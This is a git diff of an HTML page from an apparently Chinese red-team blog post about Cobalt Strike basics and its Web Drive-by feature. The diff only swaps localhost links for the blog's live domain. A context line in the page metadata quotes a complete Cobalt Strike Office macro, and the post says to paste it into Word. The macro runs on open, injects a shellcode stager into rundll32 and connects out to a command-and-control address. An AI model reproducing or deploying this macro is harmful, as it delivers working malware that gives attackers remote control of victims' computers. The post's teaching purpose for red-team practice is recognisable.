@@ -1,6 +1,6 @@
 <!doctype html>
 <html lang="en">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <head>
     <title>CS基础和WEB Drive-by功能详解 // Y4ph3tS blog</title>
     <link rel="shortcut icon" href="/favicon.ico" />
     <meta charset="utf-8" />
@@ -40,7 +40,7 @@ CS使用office宏进行攻击 新建一个office监听器
 默认生成的宏代码如下，该代码并没有做免杀，基本都会直接被杀掉
 Private Type PROCESS_INFORMATIONhProcess As LonghThread As LongdwProcessId As LongdwThreadId As LongEnd TypePrivate Type STARTUPINFOcb As LonglpReserved As StringlpDesktop As StringlpTitle As StringdwX As LongdwY As LongdwXSize As LongdwYSize As LongdwXCountChars As LongdwYCountChars As LongdwFillAttribute As LongdwFlags As LongwShowWindow As IntegercbReserved2 As IntegerlpReserved2 As LonghStdInput As LonghStdOutput As LonghStdError As LongEnd Type#If VBA7 ThenPrivate Declare PtrSafe Function CreateStuff Lib &#34;kernel32&#34; Alias &#34;CreateRemoteThread&#34; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtrPrivate Declare PtrSafe Function AllocStuff Lib &#34;kernel32&#34; Alias &#34;VirtualAllocEx&#34; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtrPrivate Declare PtrSafe Function WriteStuff Lib &#34;kernel32&#34; Alias &#34;WriteProcessMemory&#34; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtrPrivate Declare PtrSafe Function RunStuff Lib &#34;kernel32&#34; Alias &#34;CreateProcessA&#34; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long#ElsePrivate Declare Function CreateStuff Lib &#34;kernel32&#34; Alias &#34;CreateRemoteThread&#34; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPrivate Declare Function AllocStuff Lib &#34;kernel32&#34; Alias &#34;VirtualAllocEx&#34; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPrivate Declare Function WriteStuff Lib &#34;kernel32&#34; Alias &#34;WriteProcessMemory&#34; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As LongPrivate Declare Function RunStuff Lib &#34;kernel32&#34; Alias &#34;CreateProcessA&#34; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long#End IfSub Auto_Open()Dim myByte As Long, myArray As Variant, offset As LongDim pInfo As PROCESS_INFORMATIONDim sInfo As STARTUPINFODim sNull As StringDim sProc As String#If VBA7 ThenDim rwxpage As LongPtr, res As LongPtr#ElseDim rwxpage As Long, res As Long#End IfmyArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84, _60,97,124,2,44,32,-63,-49,13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48, _80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1,-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3, _125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4,-117,1,-48,-119,68,36,36,91, _91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _-43,-24,-128,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _83,73,69,32,57,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,84,114,105,100,101,110,116, _47,53,46,48,59,32,76,66,66,82,79,87,83,69,82,41,0,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _88,88,88,88,88,0,89,49,-1,87,87,87,87,81,104,58,86,121,-89,-1,-43,-21,121,91,49,-55,81,81,106,3,81,81, _104,-72,34,0,0,83,80,104,87,-119,-97,-58,-1,-43,-21,98,89,49,-46,82,104,0,2,96,-124,82,82,82,81,82,80,104, _-21,85,46,59,-1,-43,-119,-58,49,-1,87,87,87,87,86,104,45,6,24,123,-1,-43,-123,-64,116,68,49,-1,-123,-10,116,4, _-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1,-43,49,-1,87,106,7,81,86,80,104,-73,87,-32, _11,-1,-43,-65,0,47,0,0,57,-57,116,-68,49,-1,-21,21,-21,73,-24,-103,-1,-1,-1,47,53,100,120,75,0,0,104,-16, _-75,-94,86,-1,-43,106,64,104,0,16,0,0,104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,83,83,-119,-25,87,104, _0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43,-123,-64,116,-51,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,55,-1,-1,-1, _49,55,50,46,49,54,46,49,50,46,49,50,57,0)If Len(Environ(&#34;ProgramW6432&#34;)) &gt; 0 ThensProc = Environ(&#34;windir&#34;) &amp; &#34;\\SysWOW64\\rundll32.exe&#34;ElsesProc = Environ(&#34;windir&#34;) &amp; &#34;\\System32\\rundll32.exe&#34;End Ifres = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)For offset = LBound(myArray) To UBound(myArray)myByte = myArray(offset)res = WriteStuff(pInfo.hProcess, rwxpage &#43; offset, myByte, 1, ByVal 0&amp;)Next offsetres = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)End SubSub AutoOpen()Auto_OpenEnd SubSub Workbook_Open()Auto_OpenEnd Sub 将这串代码复制到WORD或者其他office中进行创建宏">
 
-    <meta property="og:url" content="http://localhost:1313/posts/cs%E5%9F%BA%E7%A1%80%E5%92%8Cwebdrive-by%E5%8A%9F%E8%83%BD%E8%AF%A6%E8%A7%A3/">
+    <meta property="og:url" content="https://yaphetszz.github.io/posts/cs%E5%9F%BA%E7%A1%80%E5%92%8Cwebdrive-by%E5%8A%9F%E8%83%BD%E8%AF%A6%E8%A7%A3/">
   <meta property="og:site_name" content="Y4ph3tS blog">
   <meta property="og:title" content="CS基础和WEB Drive-by功能详解">
   <meta property="og:description" content="CS基础 CS服务端启动方式
@@ -79,7 +79,7 @@ Private Type PROCESS_INFORMATIONhProcess As LonghThread As LongdwProcessId As
   </head>
   <body>
     <header class="app-header">
-      <a href="http://localhost:1313/"><img class="app-header-avatar" src="/avatar.jpg" alt="Y4ph3tS" /></a>
+      <a href="https://yaphetszz.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Y4ph3tS" /></a>
       <span class="app-header-title">Y4ph3tS blog</span>
       <nav class="app-header-menu">
           <a class="app-header-menu-item" href="/">主页</a>
@@ -134,13 +134,13 @@ Private Type PROCESS_INFORMATIONhProcess As LonghThread As LongdwProcessId As
         
         <div>
           <svg class="icon icon-tag" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>tag</title><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line></svg>
-              <a class="tag" href="http://localhost:1313/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/">红队技术</a>
-              <a class="tag" href="http://localhost:1313/tags/cobaltstrike/">Cobaltstrike</a>
+              <a class="tag" href="https://yaphetszz.github.io/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/">红队技术</a>
+              <a class="tag" href="https://yaphetszz.github.io/tags/cobaltstrike/">Cobaltstrike</a>
         </div>
         <div>
           <p></p>
           <p>文章分类:    </p>
-              <a class="tag" href="http://localhost:1313/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/">攻防渗透</a>
+              <a class="tag" href="https://yaphetszz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/">攻防渗透</a>
         </div>
       </div>
     </header>
